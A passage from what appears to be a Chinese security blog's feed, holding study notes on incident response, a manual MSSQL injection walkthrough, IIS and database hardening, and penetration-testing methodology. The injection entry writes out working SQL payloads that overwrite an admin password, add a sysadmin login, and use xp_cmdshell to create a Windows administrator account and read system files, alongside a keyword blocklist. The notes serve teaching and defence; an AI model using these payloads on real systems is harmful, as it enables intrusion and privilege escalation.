class="line">6</span><br></pre></td><td class="code"><pre><span class="line">核心思路是“顺藤摸瓜”</span><br><span class="line">碎片信息的关联分析</span><br><span class="line">时间范围的界定以及关键操作时间点串联</span><br><span class="line">Web入侵类，shell定位很重要</span><br><span class="line">假设与求证</span><br><span class="line">攻击画像与路线确认</span><br></pre></td></tr></table></figure><h5 id="常见的入侵方式Getshell方法"><a href="#常见的入侵方式Getshell方法" class="headerlink" title="常见的入侵方式Getshell方法 "></a>常见的入侵方式Getshell方法 </h5><p>a) WEB入侵 i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞 </p><p>b) 系统入侵 i. SSH 破解后登录操作 ii. RDP 破解后登录操作 iii. MSSQL破解后远控操作 iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p><p> c) 典型应用 i. Mail暴力破解后信息挖掘及漏洞利用 ii. VPN暴力破解后绕过边界 iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行 iv. Rsync 未授权访问类 v. Mongodb未授权访问类 vi. Elasticsearch命令执行漏洞 vii. Memcache未授权访问漏洞 viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p><h5 id="应急需求有哪些分类："><a href="#应急需求有哪些分类：" class="headerlink" title="应急需求有哪些分类："></a>应急需求有哪些分类：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> a) 被谁入侵了？ 关联 攻击IP 攻击者信息</span><br><span class="line"></span><br><span class="line"> b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息 </span><br><span class="line"></span><br><span class="line">c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息 </span><br><span class="line"></span><br><span class="line">d) 数据是否被窃取？ 关联 日志审计</span><br><span class="line"></span><br><span class="line"> e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</span><br></pre></td></tr></table></figure><h1 id="资源参考"><a href="#资源参考" class="headerlink" title="资源参考"></a>资源参考</h1><p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-find-webshell.html</a><br><a href="http://vinc.top/category/yjxy/" target="_blank" rel="noopener">http://vinc.top/category/yjxy/</a><br><a href="http://www.shellpub.com/" target="_blank" rel="noopener">http://www.shellpub.com/</a><br><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="noopener">http://linux.vbird.org/linux_security/0420rkhunter.php</a><br><a href="https://cisofy.com/download/lynis/" target="_blank" rel="noopener">https://cisofy.com/download/lynis/</a><br><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="noopener">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a><br><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/23358.html</a><br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="noopener">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a><br><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3830.html</a><br><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/65679</a><br><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="noopener">http://secsky.sinaapp.com/188.html</a><br><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a><br><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="noopener">http://www.sleuthkit.org/autopsy/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>手注mssql</title>
    <link href="http://yoursite.com/2018/08/21/mssql/"/>
    <id>http://yoursite.com/2018/08/21/mssql/</id>
    <published>2018-08-21T15:02:22.000Z</published>
    <updated>2018-08-23T14:38:10.165Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-133.png" alt="upload successful"></p><h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h3 id="1-判断数据库类型："><a href="#1-判断数据库类型：" class="headerlink" title="1.判断数据库类型："></a>1.判断数据库类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;（撇号）</span><br><span class="line">and (select count(*) from 独有表)&gt;0 </span><br><span class="line">oracle:dual</span><br><span class="line">mssql:sysobjects</span><br><span class="line">mysql:shema</span><br><span class="line">access:mssysobjects</span><br></pre></td></tr></table></figure><h3 id="2-判断版本号："><a href="#2-判断版本号：" class="headerlink" title="2.判断版本号："></a>2.判断版本号：</h3><p>（sqlserver:2000）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nt5.0:win2000,nt5.2:2003 nt6.1:win7 sp</span><br><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="3-当前连接数据库的用户："><a href="#3-当前连接数据库的用户：" class="headerlink" title="3.当前连接数据库的用户："></a>3.当前连接数据库的用户：</h3><p>（dbo=sa）<br><code>and user&gt;0</code></p><h3 id="4-判断当前连接的数据库："><a href="#4-判断当前连接的数据库：" class="headerlink" title="4.判断当前连接的数据库："></a>4.判断当前连接的数据库：</h3><p>(article)<br><code>and db_name()&gt;0</code></p><h3 id="5-判断其它数据库"><a href="#5-判断其它数据库" class="headerlink" title="5.判断其它数据库"></a>5.判断其它数据库</h3><p><code>and (select name from master..sysdatabases where dbid=6)&gt;0</code></p><h3 id="6-判断表："><a href="#6-判断表：" class="headerlink" title="6.判断表："></a>6.判断表：</h3><p>‘t_jiaozhu’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="7-判断其它表："><a href="#7-判断其它表：" class="headerlink" title="7.判断其它表："></a>7.判断其它表：</h3><p>admin<br><code>and name not in(&#39;t_jiaozhu&#39;,&#39;Aclass&#39;)</code><br>加入到6条语句最后一个括号前：</p><h3 id="8-判断列名："><a href="#8-判断列名：" class="headerlink" title="8.判断列名："></a>8.判断列名：</h3><p>admin(usernae,password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="9-判断值"><a href="#9-判断值" class="headerlink" title="9.判断值"></a>9.判断值</h3><p><code>and (select username from admin)&gt;0</code></p><h3 id="10-改密码："><a href="#10-改密码：" class="headerlink" title="10.改密码："></a>10.改密码：</h3><p>md5,小葵多功能转换工具：111转为md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--</span><br></pre></td></tr></table></figure></p><p>sqlserver高级操作：</p><h1 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h1><h3 id="一。数据库提权："><a href="#一。数据库提权：" class="headerlink" title="一。数据库提权："></a>一。数据库提权：</h3><h4 id="1-添加数据库的用户；"><a href="#1-添加数据库的用户；" class="headerlink" title="1.添加数据库的用户；"></a>1.添加数据库的用户；</h4><p><code>;exec master..sp_addlogin hyq,888888;--</code></p><h4 id="2-查看："><a href="#2-查看：" class="headerlink" title="2.查看："></a>2.查看：</h4><p><code>mssqlserver--企业管理器--安全性--登录</code></p><h4 id="3-提权："><a href="#3-提权：" class="headerlink" title="3.提权："></a>3.提权：</h4><p>把hyq加入sysadmin组<br><code>;exec master..sp_addsrvrolemember hyq,sysadmin;--</code></p><h4 id="4-利用："><a href="#4-利用：" class="headerlink" title="4.利用："></a>4.利用：</h4><p>数据库连接工具：查询分析器,navicat:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from </span><br><span class="line">drop database</span><br></pre></td></tr></table></figure></p><h3 id="二。操作系统提权"><a href="#二。操作系统提权" class="headerlink" title="二。操作系统提权"></a>二。操作系统提权</h3><h4 id="1-新建用户"><a href="#1-新建用户" class="headerlink" title="1.新建用户:"></a>1.新建用户:</h4><p><code>;exec master..xp_cmdshell &#39;net user cisp 888888 /add &#39;--</code></p><h4 id="2-提权："><a href="#2-提权：" class="headerlink" title="2.提权："></a>2.提权：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure><h4 id="3-利用："><a href="#3-利用：" class="headerlink" title="3.利用："></a>3.利用：</h4><p>3389;ipc空连接</p><h3 id="三。读系统文件"><a href="#三。读系统文件" class="headerlink" title="三。读系统文件"></a>三。读系统文件</h3><p><code>c:\boot.ini</code></p><h4 id="1-数据连接工具：navicat"><a href="#1-数据连接工具：navicat" class="headerlink" title="1.数据连接工具：navicat:"></a>1.数据连接工具：navicat:</h4><h4 id="2-查询–新建查询"><a href="#2-查询–新建查询" class="headerlink" title="2.查询–新建查询"></a>2.查询–新建查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure><h3 id="四。向系统写文件"><a href="#四。向系统写文件" class="headerlink" title="四。向系统写文件"></a>四。向系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br><span class="line">a.bat</span><br><span class="line">:1</span><br><span class="line">start iexplore.exe</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure><h3 id="五。xp-cmdshell防御："><a href="#五。xp-cmdshell防御：" class="headerlink" title="五。xp_cmdshell防御："></a>五。xp_cmdshell防御：</h3><h4 id="1-删除："><a href="#1-删除：" class="headerlink" title="1.删除："></a>1.删除：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure><h4 id="2-恢复："><a href="#2-恢复：" class="headerlink" title="2.恢复："></a>2.恢复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure><h4 id="3-防xp-cmdshell"><a href="#3-防xp-cmdshell" class="headerlink" title="3.防xp_cmdshell."></a>3.防xp_cmdshell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">防未公布：cmd反弹</span><br><span class="line">c:\windows\system32\cmd.exe</span><br><span class="line">删除所有默认权限，添加administrator--完全控制</span><br></pre></td></tr></table></figure><h3 id="六-防注入："><a href="#六-防注入：" class="headerlink" title="六.防注入："></a>六.防注入：</h3><h4 id="1-脚本调用："><a href="#1-脚本调用：" class="headerlink" title="1.脚本调用："></a>1.脚本调用：</h4><p>编写防注入脚本：noinject.asp<br>过滤关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and or union ; &apos; sp_ xp_ update</span><br><span class="line">exec select delete drop</span><br><span class="line">防post get cookie</span><br></pre></td></tr></table></figure></p><p>判断哪个脚本有漏洞<br>调用：<code>include file=noinject.asp</code><br>最前面：搜索型</p><h4 id="2-安全编码："><a href="#2-安全编码：" class="headerlink" title="2.安全编码："></a>2.安全编码：</h4><p>int–&gt;cint,参数化查询：</p><h4 id="3-waf"><a href="#3-waf" class="headerlink" title="3.waf:"></a>3.waf:</h4><p>web app fw: 软件，硬件<br>sqlmap:tamper:base<br>通配符：cat ??t /etc/passwd<br>as /**/<br>hash:<br>sqlmap.py -u url -v 3</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web终极加固</title>
    <link href="http://yoursite.com/2018/08/21/web%E7%BB%88%E6%9E%81%E5%8A%A0%E5%9B%BA-mssqlserver/"/>
    <id>http://yoursite.com/2018/08/21/web终极加固-mssqlserver/</id>
    <published>2018-08-21T14:18:05.000Z</published>
    <updated>2018-08-23T14:40:21.488Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="一-中间件加固：tomcat-weblogic-iis"><a href="#一-中间件加固：tomcat-weblogic-iis" class="headerlink" title="一.中间件加固：tomcat,weblogic,iis"></a>一.中间件加固：tomcat,weblogic,iis</h2><p>iis服务管理器-网站–dvbbs–右键–属性</p><h4 id="1-更改默认日志的路径："><a href="#1-更改默认日志的路径：" class="headerlink" title="1.更改默认日志的路径："></a>1.更改默认日志的路径：</h4><p>c:\windows\system32\logfiles:改为d:\dvbbslog:仅system可读写，administrator:读</p><p>日志存放&gt;6个月      w3c:  biglog（日志分析）   ,splunk(日志分析)</p><p>网站–属性</p><h3 id="2-高级：必选协议版本："><a href="#2-高级：必选协议版本：" class="headerlink" title="2.高级：必选协议版本："></a>2.高级：必选协议版本：</h3><p>客户端，cookie:取证</p><p>wireshark:</p><h4 id="3-不要给写入权限："><a href="#3-不要给写入权限：" class="headerlink" title="3.不要给写入权限："></a>3.不要给写入权限：</h4><p>防上传webshell:<br>主目录</p><h4 id="4-不要给目录浏览权限："><a href="#4-不要给目录浏览权限：" class="headerlink" title="4.不要给目录浏览权限："></a>4.不要给目录浏览权限：</h4><p>产生目录遍历</p><p>主目录：</p><h4 id="5-删除不必要映射："><a href="#5-删除不必要映射：" class="headerlink" title="5.删除不必要映射："></a>5.删除不必要映射：</h4><p>主目录–配置：不用到扩展名映射删除，上传.cer</p><h4 id="6-向客户端发送自定义错误信息："><a href="#6-向客户端发送自定义错误信息：" class="headerlink" title="6.向客户端发送自定义错误信息："></a>6.向客户端发送自定义错误信息：</h4><p>反制黑客：<code>&lt;iframe src=http://ip&gt;&lt;/iframe&gt;</code></p><p>主目录–配置–调试：</p><h4 id="7-中层安全策略："><a href="#7-中层安全策略：" class="headerlink" title="7.中层安全策略："></a>7.中层安全策略：</h4><p>限制后台登录ip:<br>admin右键–目录安全性–ip或域名限制<br>允许：192.168.2.6</p><h4 id="8-删除所有自定义错误信息：防黑客："><a href="#8-删除所有自定义错误信息：防黑客：" class="headerlink" title="8.删除所有自定义错误信息：防黑客："></a>8.删除所有自定义错误信息：防黑客：</h4><p>302：挂马页面<br>C:\WINDOWS\help\iisHelp\common\</p><h2 id="二-数据库加固"><a href="#二-数据库加固" class="headerlink" title="二.数据库加固"></a>二.数据库加固</h2><h4 id="1-安全架构："><a href="#1-安全架构：" class="headerlink" title="1.安全架构："></a>1.安全架构：</h4><p>禁止数据库和web同台，web–&gt;dmz,ids,数据库内网</p><h4 id="2-数据库加固："><a href="#2-数据库加固：" class="headerlink" title="2.数据库加固："></a>2.数据库加固：</h4><h5 id="a-鉴别："><a href="#a-鉴别：" class="headerlink" title="a.鉴别："></a>a.鉴别：</h5><p>单因素，双因素：网银：<br>who:你是谁：生物特征，指纹，虹膜，视网膜<br>错误接受率小，交叉错判率小<br>have:卡，证书<br>know:知识，口令，密保问题</p><p>pin码，指纹<br>密码：8-10-14 量子 ecc,rsa</p><h5 id="b-授权：访问控制："><a href="#b-授权：访问控制：" class="headerlink" title="b.授权：访问控制："></a>b.授权：访问控制：</h5><p>最小特权：<br>dac:自主访问：ACL:访问控制列表：客体：文件<br>cl:能力表：主体：用户<br>mac:强制访问：敏感标签：文件：绝密，用户：绝密 安全模型：blp:机密性：禁止上读下写<br>rbac:基于角色:最小特权<br>group:<br>基于上下文：TCP,基于时间，基于内容：邮件过滤<br>everyone,administrators,users</p><h5 id="c-完整性：hash-摘要"><a href="#c-完整性：hash-摘要" class="headerlink" title="c.完整性：hash:摘要"></a>c.完整性：hash:摘要</h5><p>任意长度的消息生成 等长的摘要<br>两个不同的消息产生相同的摘要：碰撞<br>md5:10^42,10^21,10^10 128<br>sha1:160<br>sha256<br>过杀毒软件：<br>头同尾不同，md5相同：<br>头不同尾相同，md5相同</p><h5 id="d-机密性：加密"><a href="#d-机密性：加密" class="headerlink" title="d.机密性：加密"></a>d.机密性：加密</h5><p>https:ssl:安全套接层：握手：身份认证及算法密钥协商，记录：加密<br>cipher suite:算法套件<br>ecdhe(密钥交换)-RSA(签名)-AES(加密)-sha256<br>降级：ecdhe-rsa-3des-md5<br>ssl strip:中间人<br><a href="http://www.taobao.com" target="_blank" rel="noopener">http://www.taobao.com</a><br>arp -a:ip–mac:攻击者<br>ssldos:<br>算法弱点：drown rsa<br>rsa:伪随机数算法：后门：ec-dual-drbg:NSA:-1000万美元，常量–推出密钥，bsafe:<br>高级会话复制：黑产<br>证书伪造<br>证书劫持<br>ukey高级克隆，远程映射，内存泄露<br>网银大盗：3 UKEY</p><h5 id="E-抗抵赖："><a href="#E-抗抵赖：" class="headerlink" title="E:抗抵赖："></a>E:抗抵赖：</h5><p>数字签名：私钥+hash 伪造<br>粒度越小越灵活越安全<br>库—表：行，列：学生，老师，<br>事前检测：运行环境漏洞；数据库漏洞：<br>事中监测：sql语句：查询，返回<br>事后审计：日志</p><h4 id="3-更改默认数据库名字及路径：数据库的配置文件"><a href="#3-更改默认数据库名字及路径：数据库的配置文件" class="headerlink" title="3.更改默认数据库名字及路径：数据库的配置文件"></a>3.更改默认数据库名字及路径：数据库的配置文件</h4><p>防下载：数据库重定向到url:<a href="http://www.dvbbs.com" target="_blank" rel="noopener">http://www.dvbbs.com</a><br>iis服务管理器–网站-dvbbs–data–dvbbs7.mdb<br>右键–重定向到url</p><h2 id="三-权限加固："><a href="#三-权限加固：" class="headerlink" title="三.权限加固："></a>三.权限加固：</h2><p>网站源码目录：c:\bbsbak–右键–安全 ntfs</p><p>1.删除所有默认权限<br>2.添加administrator:完全控制<br>3.添加iis_wpg:完全控制<br>4.添加iusr_benet:只读<br>5.判断哪些目录需要写入权限<br>upload,data,databackup,uploadface—给iusr_benet 写入<br>防webshell<br>6.给以上有写入目录权限的文件夹，执行权限：无<br>iis服务管理器–网站—dvbbs–uploadface–右键–目录–执行权限：无</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试流程</title>
    <link href="http://yoursite.com/2018/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/08/21/渗透测试流程/</id>
    <published>2018-08-21T13:37:05.000Z</published>
    <updated>2018-08-21T14:45:53.178Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-106.png" alt="upload successful"></p><h1 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h1><p>通过实际的攻击进行安全测试与评估的方法</p><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等</p><h1 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h1><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><p>完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。</p><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>费时费力 需要高技术  </p><h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试</p><h5 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h5><p>可以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。时间少代价低  </p><h5 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h5><p>最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 </p><h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><p>黑白组合可以提供对目标系统更加深入和全面的安全审查</p><h1 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h1><p>安全测试方法学开源手册（osstmm） </p><p>网络安全测试指南（NIST SP 800-42） </p><p>OWASP十大Web应用安全威胁项目     </p><p>Web安全威胁分类标准（WASC-TC）  </p><p>完整方法论：PTES 渗透测试执行标准 (Penetration Testing Execution Standard)</p><h1 id="PTES渗透测试执行标准"><a href="#PTES渗透测试执行标准" class="headerlink" title="PTES渗透测试执行标准"></a>PTES渗透测试执行标准</h1><h4 id="1-前期交互阶段-Pre-Engagement-Interaction"><a href="#1-前期交互阶段-Pre-Engagement-Interaction" class="headerlink" title="1.前期交互阶段(Pre-Engagement Interaction)"></a>1.前期交互阶段(Pre-Engagement Interaction)</h4><p>渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h4 id="2情报搜集阶段（Informatin-Gathering）"><a href="#2情报搜集阶段（Informatin-Gathering）" class="headerlink" title="2情报搜集阶段（Informatin Gathering）"></a>2情报搜集阶段（Informatin Gathering）</h4><p>在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等，情报搜集是否充分在很大程度上决定了渗透测试的成败。</p><h4 id="3威胁建模阶段（Threat-Modeling）"><a href="#3威胁建模阶段（Threat-Modeling）" class="headerlink" title="3威胁建模阶段（Threat Modeling）"></a>3威胁建模阶段（Threat Modeling）</h4><p>在搜集到充分的情报信息之后，大家聚集到一起针对获取的信息进行威胁建模与攻击规划，通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道</p><h4 id="4-漏洞分析阶段（Vulnerablity-Analysis）"><a href="#4-漏洞分析阶段（Vulnerablity-Analysis）" class="headerlink" title="4.漏洞分析阶段（Vulnerablity Analysis）"></a>4.漏洞分析阶段（Vulnerablity Analysis）</h4><p>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h4 id="5-渗透攻击阶段（Exploitation）"><a href="#5-渗透攻击阶段（Exploitation）" class="headerlink" title="5.渗透攻击阶段（Exploitation）"></a>5.渗透攻击阶段（Exploitation）</h4><p>在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸（清除痕迹），从而避免造成目标组织安全响应团队的警觉和发现。 </p><h4 id="6-后渗透测试阶段（Post-Exploitation）"><a href="#6-后渗透测试阶段（Post-Exploitation）" class="headerlink" title="6.后渗透测试阶段（Post Exploitation）"></a>6.后渗透测试阶段（Post Exploitation）</h4><p>在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。</p><h4 id="7-报告阶段（Reporting）"><a href="#7-报告阶段（Reporting）" class="headerlink" title="7.报告阶段（Reporting）"></a>7.报告阶段（Reporting）</h4><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发</p><h1 id="安全漏洞的生命周期"><a href="#安全漏洞的生命周期" class="headerlink" title="安全漏洞的生命周期"></a>安全漏洞的生命周期</h1><h4 id="一个典型的安全漏洞的生命周期分为七个部分："><a href="#一个典型的安全漏洞的生命周期分为七个部分：" class="headerlink" title="一个典型的安全漏洞的生命周期分为七个部分："></a>一个典型的安全漏洞的生命周期分为七个部分：</h4><p>1.安全漏洞的挖掘与研究</p><p>2.渗透代码的开发与测试</p><p>3.安全漏洞与渗透代码在封闭团队内流传，截止到这个阶段为oday</p><p>4.安全漏洞与渗透代码开始扩散</p><p>5.恶意程序出现开始传播，厂商发布补丁</p><p>6.渗透代码/恶意程序大规模传播并开始危害互联网，危害达到巅峰</p><p>7.渗透代码/恶意程序/攻击工具逐渐消亡</p><h4 id="安全漏洞生命周期示意图"><a href="#安全漏洞生命周期示意图" class="headerlink" title="安全漏洞生命周期示意图"></a>安全漏洞生命周期示意图</h4><p><img src="\images\pasted-103.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件处理漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/文件处理漏洞/</id>
    <published>2018-08-21T12:53:05.000Z</published>
    <updated>2018-08-21T13:31:18.199Z</updated>
    
